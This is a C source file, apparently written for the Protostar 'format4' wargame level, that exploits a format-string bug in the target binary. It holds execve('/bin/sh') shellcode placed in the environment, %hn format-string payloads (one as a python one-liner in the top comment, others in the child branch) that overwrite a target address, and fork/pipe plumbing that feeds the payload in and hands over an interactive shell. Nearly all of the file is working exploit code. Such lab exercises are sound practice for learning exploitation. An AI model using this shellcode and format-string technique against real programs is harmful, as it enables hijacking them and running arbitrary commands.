// python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%2044x%5$hn%31920x%4$hn"' | ./format4
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>

char shellcode[] = "sc=\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(int argc, char *argv)
{
    int fd[2];
    pid_t childpid;

    if (pipe(fd) == -1)
    {
        perror("Fatal error piping process");
        exit(1);
    }

    if ((childpid = fork()) == -1)
    {
        perror("Fatal error forking process");
        exit(1);
    }

    if (childpid == 0)
    {
        close(fd[0]);
        // char payload[] = "\xc4\xff\xff\xbf%4$s"; // 0xbfffffc7を読み込み
        // char payload[] = "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08%175c%7$hhn%8c%4$hhn%56c%5$hhn%6$hhn"; // 0xbfffffc7
        char payload[] = "\x24\x97\x04\x08\x26\x97\x04\x08%49143c%5$hn%16328c%4$hn"; // 0xbfffffc7
        write(fd[1], payload, strlen(payload));
        write(fd[1], "\n", 1);

        int n = 0; char buffer[256];
        while ((n = read(0, buffer, 256)) > 0)
            write(fd[1], buffer, strlen(buffer));
    }

    else
    {
        close(fd[1]);
        dup2(fd[0], STDIN_FILENO);
        char *env[] = {shellcode, NULL};
        execle("/opt/protostar/bin/format4", "format4", NULL, env);
    }

    return 0;
}
